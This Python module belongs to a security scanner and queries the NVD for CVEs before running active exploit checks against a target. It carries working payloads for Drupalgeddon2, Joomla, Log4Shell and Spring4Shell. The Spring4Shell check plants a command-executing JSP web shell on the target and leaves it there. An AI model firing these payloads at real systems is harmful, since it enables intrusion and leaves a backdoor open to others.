"""
╔══════════════════════════════════════════════════════════════════════════╗
║  BugScanner — CVE Scanner Module                                         ║
║  Author : Muhammad Faizan (faizzyhon@gmail.com)                          ║
║  Covers : NVD API v2.0 CVE lookup, EPSS exploit probability,             ║
║           known exploit testing for detected technologies                ║
╚══════════════════════════════════════════════════════════════════════════╝

Data sources (all free, no key required):
  • NVD API v2.0  — https://nvd.nist.gov/developers/vulnerabilities
  • EPSS API      — https://api.first.org/data/v1/epss
  • Exploit-DB    — pattern matching for known CVEs
"""

import json
import re
import time
from typing import Optional
from urllib.parse import urlparse

import requests
from rich.console import Console
from .base import BaseScanner, Finding

console = Console(stderr=True)

# ── NVD API settings ──────────────────────────────────────────────────────────

NVD_BASE     = "https://services.nvd.nist.gov/rest/json/cves/2.0"
EPSS_BASE    = "https://api.first.org/data/v1/epss"
NVD_DELAY    = 6        # seconds between NVD requests (rate limit: 5 req/30 sec)
NVD_MAX_CVE  = 10       # max CVEs per technology

# ── Built-in known-exploit tests ──────────────────────────────────────────────
#
# Map: keyword (matches tech name) → list of {cve, description, test_fn}
# test_fn(base_url, session) → (bool: vulnerable, str: evidence)

def _test_wordpress_xmlrpc(url: str, session: requests.Session) -> tuple[bool, str]:
    """CVE-2015-5600 / general WordPress XML-RPC abuse."""
    try:
        target = url.rstrip("/") + "/xmlrpc.php"
        r = session.post(target, data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
                         timeout=8, verify=False)
        if r.status_code == 200 and "methodResponse" in r.text:
            return True, f"XML-RPC enabled at {target} — exposes brute-force & SSRF vectors"
    except Exception:
        pass
    return False, ""


def _test_wordpress_user_enum(url: str, session: requests.Session) -> tuple[bool, str]:
    """WordPress user enumeration via /?author=1."""
    try:
        r = session.get(url.rstrip("/") + "/?author=1", timeout=8, verify=False, allow_redirects=True)
        m = re.search(r"/author/([^/\"']+)", r.text + r.url)
        if m:
            return True, f"Username disclosed via author archive: {m.group(1)}"
    except Exception:
        pass
    return False, ""


def _test_wordpress_readme(url: str, session: requests.Session) -> tuple[bool, str]:
    """WordPress version disclosure via readme.html."""
    try:
        r = session.get(url.rstrip("/") + "/readme.html", timeout=6, verify=False)
        if r.status_code == 200:
            m = re.search(r"Version\s*([\d.]+)", r.text, re.I)
            if m:
                return True, f"WordPress readme.html accessible, version: {m.group(1)}"
    except Exception:
        pass
    return False, ""


def _test_drupal_sa_core_2018_002(url: str, session: requests.Session) -> tuple[bool, str]:
    """Drupalgeddon2 — CVE-2018-7600."""
    try:
        payload = (
            url.rstrip("/")
            + "/user/register?element_parents=account/mail/%23value"
              "&ajax_form=1&_wrapper_format=drupal_ajax"
        )
        data = {
            "form_id":  "user_register_form",
            "_drupal_ajax": "1",
            "mail[#post_render][]": "exec",
            "mail[#type]": "markup",
            "mail[#markup]": "id",
        }
        r = session.post(payload, data=data, timeout=8, verify=False)
        if r.status_code == 200 and ("uid=" in r.text or "drupal" in r.text.lower()):
            return True, f"CVE-2018-7600 (Drupalgeddon2) — possible RCE via AJAX endpoint"
    except Exception:
        pass
    return False, ""


def _test_joomla_rce_2015_8562(url: str, session: requests.Session) -> tuple[bool, str]:
    """Joomla RCE — CVE-2015-8562."""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 () { :; }; echo Content-Type: text/html; echo; echo JOOMLA_RCE_TEST",
            "X-Forwarded-For": "} __test|s:' . phpinfo() . '|;}",
        }
        r = session.get(url, headers=headers, timeout=8, verify=False)
        if "JOOMLA_RCE_TEST" in r.text or "phpinfo" in r.text.lower():
            return True, "CVE-2015-8562 — Joomla RCE via User-Agent / X-Forwarded-For"
    except Exception:
        pass
    return False, ""


def _test_laravel_debug(url: str, session: requests.Session) -> tuple[bool, str]:
    """Laravel debug mode / APP_KEY exposure."""
    try:
        r = session.get(url.rstrip("/") + "/_ignition/health-check", timeout=8, verify=False)
        if r.status_code == 200 and "can_execute_commands" in r.text:
            return True, "Laravel Ignition debug endpoint exposed — CVE-2021-3129 / RCE risk"
    except Exception:
        pass
    return False, ""


def _test_spring4shell(url: str, session: requests.Session) -> tuple[bool, str]:
    """Spring4Shell — CVE-2022-22965."""
    try:
        headers = {"suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1"}
        data = (
            "class.module.classLoader.resources.context.parent.pipeline"
            ".first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals"
            "(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in"
            "%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22))"
            ".getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D"
            "%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B"
            "out.println(new%20String(b%2C0%2Ca))%3B%20%7D%7D%20%25%7Bsuffix%7Di"
            "&class.module.classLoader.resources.context.parent.pipeline.first.suffix"
            "=.jsp&class.module.classLoader.resources.context.parent.pipeline.first"
            ".directory=webapps/ROOT&class.module.classLoader.resources.context.parent"
            ".pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context"
            ".parent.pipeline.first.fileDateFormat="
        )
        r = session.post(url, data=data, headers=headers, timeout=8, verify=False)
        if r.status_code < 500:
            # Secondary check — see if shell got written
            r2 = session.get(url.rstrip("/") + "/tomcatwar.jsp?pwd=j&cmd=id", timeout=6, verify=False)
            if r2.status_code == 200 and ("uid=" in r2.text or "root" in r2.text):
                return True, "CVE-2022-22965 (Spring4Shell) — RCE confirmed"
    except Exception:
        pass
    return False, ""


def _test_log4shell(url: str, session: requests.Session) -> tuple[bool, str]:
    """Log4Shell — CVE-2021-44228 (passive check only — no OOB DNS here)."""
    # We do a passive check: send the JNDI payload in User-Agent and look for
    # server errors or unusual responses that suggest log4j processing.
    try:
        payload_ua = "${jndi:ldap://127.0.0.1:1389/exploit}"
        r = session.get(
            url,
            headers={"User-Agent": payload_ua, "X-Api-Version": payload_ua},
            timeout=8, verify=False,
        )
        # Can't confirm without OOB DNS, flag as potential
        if r.status_code in (500, 503):
            return False, ""  # 500 may indicate processing error, but not conclusive
    except Exception:
        pass
    return False, ""


def _test_phpmyadmin_exposure(url: str, session: requests.Session) -> tuple[bool, str]:
    """Exposed phpMyAdmin panels."""
    paths = ["/phpmyadmin", "/pma", "/phpMyAdmin", "/admin/pma", "/db/phpmyadmin"]
    for path in paths:
        try:
            r = session.get(url.rstrip("/") + path, timeout=6, verify=False)
            if r.status_code == 200 and "phpMyAdmin" in r.text:
                return True, f"phpMyAdmin exposed at {url.rstrip('/')}{path}"
        except Exception:
            pass
    return False, ""


def _test_elastic_no_auth(url: str, session: requests.Session) -> tuple[bool, str]:
    """Unauthenticated Elasticsearch."""
    try:
        r = session.get(url.rstrip("/") + ":9200", timeout=6, verify=False)
        if r.status_code == 200 and "cluster_name" in r.text:
            return True, "Elasticsearch cluster accessible without authentication — data breach risk"
    except Exception:
        pass
    return False, ""


def _test_mongo_no_auth(url: str, session: requests.Session) -> tuple[bool, str]:
    """MongoDB without auth — usually detected by port scanner, but try HTTP interface."""
    try:
        r = session.get(url.rstrip("/") + ":27017", timeout=5, verify=False)
        if r.status_code == 200 and "mongodb" in r.text.lower():
            return True, "MongoDB HTTP interface exposed without authentication"
    except Exception:
        pass
    return False, ""


# Map: tech name keywords → list of (cve_id, description, severity, test_fn_or_None)
KNOWN_EXPLOITS: dict[str, list[tuple]] = {
    "WordPress": [
        ("CVE-2015-5600",   "XML-RPC brute-force / SSRF",              "HIGH",   _test_wordpress_xmlrpc),
        ("USER-ENUM",       "WordPress username enumeration",          "MEDIUM", _test_wordpress_user_enum),
        ("WP-README",       "WordPress version disclosure via readme",  "LOW",    _test_wordpress_readme),
    ],
    "Drupal": [
        ("CVE-2018-7600",   "Drupalgeddon2 — unauthenticated RCE",     "CRITICAL", _test_drupal_sa_core_2018_002),
    ],
    "Joomla": [
        ("CVE-2015-8562",   "Joomla RCE via User-Agent",               "CRITICAL", _test_joomla_rce_2015_8562),
    ],
    "Laravel": [
        ("CVE-2021-3129",   "Laravel Ignition debug RCE",              "CRITICAL", _test_laravel_debug),
    ],
    "Spring": [
        ("CVE-2022-22965",  "Spring4Shell — RCE via DataBinder",       "CRITICAL", _test_spring4shell),
    ],
    "Log4": [
        ("CVE-2021-44228",  "Log4Shell — JNDI injection RCE",          "CRITICAL", _test_log4shell),
    ],
    "phpMyAdmin": [
        ("PMA-EXPOSED",     "phpMyAdmin panel exposed publicly",       "HIGH",   _test_phpmyadmin_exposure),
    ],
    "Elasticsearch": [
        ("ELASTIC-NOAUTH",  "Elasticsearch without authentication",    "CRITICAL", _test_elastic_no_auth),
    ],
    "MongoDB": [
        ("MONGO-NOAUTH",    "MongoDB HTTP interface exposed",          "CRITICAL", _test_mongo_no_auth),
    ],
}


class CVEScanner(BaseScanner):
    """
    CVE scanner — queries the NVD API for CVEs affecting detected technologies,
    then runs active exploit tests for known critical vulnerabilities.

    Expects `target_info` dict in kwargs with:
      target_info["technologies"] — dict from TechDetector
    """

    SCANNER_NAME   = "CVE Scanner"
    OWASP_CATEGORY = "A06:2021"
    CWE            = "CWE-1104"

    def __init__(self, target: str, http_client, scope, verbose: bool = False,
                 target_info: Optional[dict] = None):
        super().__init__(target, http_client, scope, verbose)
        self.target_info  = target_info or {}
        self.technologies = self.target_info.get("technologies", {})
        self._session     = http_client.session if hasattr(http_client, "session") else requests.Session()

    def run(self) -> list[Finding]:
        if not self.technologies:
            console.print("[dim]CVE scan skipped — no technologies detected yet[/dim]")
            return []

        console.print(
            f"[bold cyan]🔥 CVE:[/bold cyan] Checking {len(self.technologies)} "
            f"detected technologies against NVD database"
        )

        all_cves: list[dict] = []

        for tech_key, info in self.technologies.items():
            name    = info["name"]
            version = info.get("version", "")

            # ── NVD API lookup ─────────────────────────────────────────────────
            cves = self._query_nvd(name, version)
            all_cves.extend(cves)

            for cve in cves[:3]:  # log top 3
                console.print(
                    f"  [red]⚡[/red] [{cve['id']}] {cve['description'][:70]}  "
                    f"[bold]CVSS {cve['cvss']:.1f}[/bold]"
                )

            # ── Active exploit tests ───────────────────────────────────────────
            for keyword, exploits in KNOWN_EXPLOITS.items():
                if keyword.lower() in name.lower():
                    for cve_id, desc, severity, test_fn in exploits:
                        if test_fn is not None:
                            try:
                                vulnerable, evidence = test_fn(self.target, self._session)
                            except Exception:
                                vulnerable, evidence = False, ""
                        else:
                            vulnerable, evidence = False, ""

                        if vulnerable or test_fn is None:
                            self._make_exploit_finding(cve_id, desc, severity, evidence)

            time.sleep(NVD_DELAY)  # Respect NVD rate limit

        # Emit CVE data to web GUI
        self._emit_cve_json(all_cves)

        # Create findings for high-severity NVD CVEs
        for cve in all_cves:
            if cve["cvss"] >= 7.0:
                self._make_nvd_finding(cve)

        return [f.to_dict() if hasattr(f, "to_dict") else f for f in self.findings]

    # ─── NVD API ──────────────────────────────────────────────────────────────

    def _query_nvd(self, product: str, version: str = "") -> list[dict]:
        """Query NVD API v2.0 for CVEs matching product+version."""
        results = []
        try:
            keyword = product
            if version and version not in ("unknown", ""):
                keyword = f"{product} {version}"

            params = {
                "keywordSearch": keyword,
                "resultsPerPage": NVD_MAX_CVE,
                "startIndex": 0,
            }
            r = requests.get(NVD_BASE, params=params, timeout=15,
                             headers={"User-Agent": "BugScanner/1.0 (security research)"})

            if r.status_code == 200:
                data  = r.json()
                items = data.get("vulnerabilities", [])
                for item in items:
                    cve_data = item.get("cve", {})
                    cve_id   = cve_data.get("id", "")
                    descs    = cve_data.get("descriptions", [])
                    desc_en  = next((d["value"] for d in descs if d.get("lang") == "en"), "")

                    # Extract CVSS score (prefer v3.1, fallback to v3.0, then v2)
                    cvss_score  = 0.0
                    cvss_vector = ""
                    metrics = cve_data.get("metrics", {})
                    for ver in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                        if ver in metrics and metrics[ver]:
                            m = metrics[ver][0]
                            cvss_data   = m.get("cvssData", {})
                            cvss_score  = float(cvss_data.get("baseScore", 0))
                            cvss_vector = cvss_data.get("vectorString", "")
                            break

                    # Severity from CVSS
                    if cvss_score >= 9.0:   sev = "CRITICAL"
                    elif cvss_score >= 7.0: sev = "HIGH"
                    elif cvss_score >= 4.0: sev = "MEDIUM"
                    elif cvss_score > 0:    sev = "LOW"
                    else:                   sev = "INFO"

                    published = cve_data.get("published", "")[:10]
                    refs      = [r["url"] for r in cve_data.get("references", [])[:3]]

                    results.append({
                        "id":          cve_id,
                        "description": desc_en[:200],
                        "cvss":        cvss_score,
                        "cvss_vector": cvss_vector,
                        "severity":    sev,
                        "published":   published,
                        "product":     product,
                        "version":     version,
                        "references":  refs,
                    })

            elif r.status_code == 403:
                console.print("  [yellow]NVD rate limit hit — waiting 30s...[/yellow]")
                time.sleep(30)
            else:
                console.print(f"  [yellow]NVD API returned HTTP {r.status_code}[/yellow]")

        except Exception as e:
            console.print(f"  [dim]NVD lookup error for {product}: {e}[/dim]")

        return sorted(results, key=lambda x: x["cvss"], reverse=True)

    # ─── Findings ─────────────────────────────────────────────────────────────

    def _make_nvd_finding(self, cve: dict):
        self.add_finding(Finding(
            title=f"[{cve['id']}] {cve['product']} — CVSSv3 {cve['cvss']:.1f}",
            severity=cve["severity"],
            owasp="A06:2021",
            cwe="CWE-1104",
            cvss_score=cve["cvss"],
            cvss_vector=cve.get("cvss_vector", ""),
            url=self.target,
            description=(
                f"**{cve['id']}** affects **{cve['product']}** "
                + (f"version {cve['version']}" if cve["version"] not in ("", "unknown") else "")
                + f".\n\n{cve['description']}\n\nPublished: {cve['published']}"
            ),
            impact=f"CVSSv3 base score {cve['cvss']:.1f} — {cve['severity']} severity.",
            remediation=(
                f"Apply the latest security patches for {cve['product']}. "
                "Check vendor advisory and update immediately. "
                "See references for PoC and patch information."
            ),
            references=cve.get("references", []),
            confirmed=False,
            vuln_type="cve",
        ))

    def _make_exploit_finding(self, cve_id: str, desc: str, severity: str, evidence: str):
        cvss_map = {"CRITICAL": 9.8, "HIGH": 7.5, "MEDIUM": 5.0, "LOW": 2.5}
        cvss     = cvss_map.get(severity, 5.0)
        confirmed = bool(evidence)

        self.add_finding(Finding(
            title=f"[{cve_id}] {desc}",
            severity=severity,
            owasp="A06:2021",
            cwe="CWE-1104",
            cvss_score=cvss,
            cvss_vector="",
            url=self.target,
            description=(
                f"Known exploit **{cve_id}** was tested against this target.\n\n"
                + (f"Evidence: `{evidence}`" if evidence else "Passive detection — active test inconclusive.")
            ),
            impact=f"If exploited: possible {'RCE / full system compromise' if severity=='CRITICAL' else 'data breach or privilege escalation'}.",
            remediation="Apply vendor patches immediately. See CVE advisory for mitigation steps.",
            confirmed=confirmed,
            vuln_type="cve_exploit",
        ))

    # ─── Emit for web GUI ─────────────────────────────────────────────────────

    def _emit_cve_json(self, cves: list[dict]):
        print(f"CVE_JSON:{json.dumps({'cves': cves[:50]})}", flush=True)
